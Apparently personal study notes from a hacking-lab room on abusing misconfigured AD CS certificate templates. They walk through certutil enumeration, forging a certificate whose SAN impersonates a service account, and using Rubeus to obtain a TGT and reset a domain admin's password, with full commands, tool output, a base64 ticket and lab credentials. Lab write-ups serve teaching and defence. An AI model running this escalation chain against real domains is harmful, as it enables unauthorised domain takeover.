# AD Certificate Template  
This section explores the Active Directory Certificate Service and the misconfigurations seen with certificate templates.  
- How to enumerate misconfigured templates  
- Create a privileged escalation exploit using templates  

RDP into machine:
- Username: thm
- Password: Password1@
- Domain: lunar.eruca.com
 
# Certificate Templates
Windows Active Directory is not just used for identity and access management but provides a significant amount of services to help you run and manage organization.  

### Active Directory Certificate Services (AD CS)  
- MS Public Key Infrastructure implementation
- AD provides a level of trust in an organization
- Can be used as a Certificate Authority to prove and delegate trust
- Used for several things; encrypting file systems, creating + verifying digital signatures + user authentication

### Certificate Requests and Generation Flow
![Alt text](<../Images/Certificate Requests flow.png>)

- AD CS normally runs on selected domain controllers (normal users are unable to interact with the service directly)
- Organizations can be too large to have an administrator + distribute each certificate manually; Certificate Templates
- Administrators of AD CS can create templates that can allow any user with relevant permissions to request a certificate
- Templates have parameters that say which user can request the certificate and what is required

### Terminology
`Public Key Infrastructure/PKI` : system that manages certificates and public key encryption  

`Active Directory Certificate Services/AD CS` : Microsoft PKI implementation which usually runs on domain controllers  

`Certificate Authority/CA` : is a PKI that issues certificates

`Certificate Template` : a collection of settings/policies that defines how and when a certificate may be issued by CA

`Certificate Signing Request/CSR` : is a message sent to a CA to request a signed certificate

`Extended Key Usage/EKU` : object identifiers that define how a generated certificate may be used

# Certificate Template Enumeration
Enumerate all certificate templates to identify vulnerable ones and understand what is required to exploit them.  

Windows has powerful built-in tools that can be used to enumerate all certificate templates and their associated policies.

### Certutil
If we have access to a domain-joined computer and authenticated to the domain, we can execute certuti (cmd) to enumerate all templates and store them in a file.  
<pre>certutil -v -template > cert_templates.txt</pre>

![Alt text](../Images/certutil.png)

- Each template is denoted by Template[X] where X is the number

The specific parameter set that we are looking for is one that has the following:
-  A template where we have the relevant permissions to request the certificate
- A template that allows client authentication, use it for Kerberos authentication
- A template that allows us to edit the Subject Alternative Name (SAN)

### Parameter 1: Relevant Permissions
Permissions to generate a certificate request in order for exploit to work
- Template where user has `AllowEnrol` or `AllowFullControl` Permissions
- Certificate templates permissions are assigned to AD groups, not directly to AD users
- Grep for all Allow Enrol keywords + review output to see if any returned groups match the group that user belongs to

Find your own groups <pre>net user username /domain </pre>

2 groups that will be common for certificates:
- `Domain Users` : Authenticated users can request certificate
- `Domain Computers` : Machine account of a domain-joined host can request certificate

### Parameter 2 : Client Authentication
- Shorten list to certificate templates that we are allowed to request > ensure certificate has the Client Authentication EKU
- EKU > Certificate can be used for Kerberos authentication
- Review EKU properties of the template + ensure Client Authentication is provided

### Parameter 3 : Client Specifies SAN
- Verify that the template allows us (certificate client) to specify the SAN
- If we have ability to control SAN > leverage the certificate to generate a Kerberos ticket for any AD account

To find these templates, we grep for `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` property flag = 1
- Indicates we can specify the SAN ourselves
- Find template where all 3 conditions are met

# Generate a Malicious Certificate
We have identified a certificate template that can be exploited, now we need to generate the certificate request.

### Microsoft Management Console
- MMC > File > Add/Remove Snap in > Certificates
- Certificates > Personal > Right click > All Tasks > Request New Certificate

![Alt text](<../Images/Request New Certificate.png>)

- More information is required to enroll certificate

![Alt text](<../Images/Certificate Properties.png>)

In order to ensure that the certificate can be exploited for a Kerberos ticket of a privileged user, we require the User Principal Name of the user we wish to impersonate.
This can be found using the AD-RSAT tools or PowerView scripts.  

Impersonate one of the DA users in this domain:
- svc.gitlab account
- Service account meaning Kerberos authentication is likely
- UPN is svc.gitlab@lunar.eruca.com  

Edit certificate:
- Subject name > common name > name we want for this certificate > vulncert
- Alternative name > User Principal Name > UPN of account > svc.gitlab@lunar.eruca.com

![Alt text](<../Images/Certificate Properties Edit.png>)

We are now able to enroll certificate:

![Alt text](<../Images/Enroll certificate.png>)

Once enrolled, we will be able to view the certificate under personal certificates.

SAN specifies the UPN of the account we want to impersonate:  

![Alt text](<../Images/SAN Certificate.png>)

Successfully generated a certificate that will provide us with persistent authentication to the domain.  

Export certificate for use:
- Right click on certificate > All Tasks > Export (Private Key)
- Certificate will be in `pfx` format
- Configure password to ensure Private Key is exported

# User Impersonation via Certificate
2 steps are required to impersonate a user:
- Use the certificate to request a Kerberos TGT
- Load the Kerberos TGT into hacking platform of choice

### Rubeus
- Kerberos interaction and abuses
- Request TGT

<pre>Rubeus.exe asktgt /user:svc.gitlab /enctype:aes256 /certificate: /password: /outfile:TGT to > /domain:lunar.eruca.com /dc:</pre>

`/user` : Specifies the user we want to impersonate + match the UPN for the certificate we generated  
`/enctype` : Specifies encryption type for ticket  
`/certificate` : Path to certificate we have generated  
`/password` : Password for certificate file  
`/outfile` : File where our TGT will be output to  
`/domain` : FQDN of the domain we are currently attacking  
`/dc` : ip of the domain where we are requesting TGT from (select DC that has a CA service running)  
 <pre>C:\THMTools> .\Rubeus.exe asktgt /user:svc.gitlab /enctype:aes256 /certificate:vulncert.pfx /password:tryhackme /outfile:svc.gitlab.kirbi /domain:lunar.eruca.com /dc:10.10.69.219</pre>  

 <pre>          ______        _
         (_____ \      | |
          _____) )_   _| |__  _____ _   _  ___
         |  __  /| | | |  _ \| ___ | | | |/___)
         | |  \ \| |_| | |_) ) ____| |_| |___ |
         |_|   |_|____/|____/|_____)____/(___/
       
         v2.0.0
       
       [*] Action: Ask TGT
       
       [*] Using PKINIT with etype aes256_cts_hmac_sha1 and subject: CN=vulncert
       [*] Building AS-REQ (w/ PKINIT preauth) for: 'lunar.eruca.com\svc.gitlab'
       [+] TGT request successful!
       [*] base64(ticket.kirbi):
       
             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
       
         ServiceName              :  krbtgt/lunar.eruca.com
         ServiceRealm             :  LUNAR.ERUCA.COM
         UserName                 :  svc.gitlab
         UserRealm                :  LUNAR.ERUCA.COM
         StartTime                :  2/6/2022 5:54:46 PM
         EndTime                  :  2/7/2022 3:54:46 AM
         RenewTill                :  2/13/2022 5:54:46 PM
         Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
         KeyType                  :  aes256_cts_hmac_sha1
         Base64(key)              :  Qr+FUX+/G2jHgAR2ssW11+lhaPlB6dMD8V5/rENwJVU=
         ASREP (key)              :  BF2483247FA4CB89DA0417DFEC7FC57C79170BAB55497E0C45F19D976FD617ED </pre>

- Use TGT to gain access
- Alter the password for one of the domain administrators
- Log into Domain Controller as administrator

![Alt text](<../Images/Admin DA.png>)

- Select DA to target from the list above
- Target da-nread

<pre>Rubeus.exe changepw /ticket:path to ticket file /new:new password for user /dc:LUNDC.lunar.eruca.com /targetuser:lunar.eruca.com\username of targeted DA</pre>


<pre>C:\THMTools> .\Rubeus.exe changepw /ticket:svc.gitlab.kirbi /new:Tryhackme! /dc:LUNDC.lunar.eruca.com /targetuser:lunar.eruca.com\da-nread
           ______        _
          (_____ \      | |
           _____) )_   _| |__  _____ _   _  ___
          |  __  /| | | |  _ \| ___ | | | |/___)
          | |  \ \| |_| | |_) ) ____| |_| |___ |
          |_|   |_|____/|____/|_____)____/(___/
        
          v2.0.0
        
        [*] Action: Reset User Password (AoratoPw)
        
        [*] Using domain controller: LUNDC.lunar.eruca.com (10.10.69.219)
        [*] Resetting password for target user: lunar.eruca.com\da-nread
        [*] New password value: Tryhackme!
        [*] Building AP-REQ for the MS Kpassword request
        [*] Building Authenticator with encryption key type: aes256_cts_hmac_sha1
        [*] base64(session subkey): UP+L2OgmJ281TkkXYNKR0ahLJni1fIk/XMBFwwNTP7Q=
        [*] Building the KRV-PRIV structure
        [+] Password change success!</pre>

- Compromised DA
- Authenticate as compromised DA user in command prompt

<pre>runas /user:lunar.eruca.com\da-nread cmd.exe</pre>

- Provide password for the associated account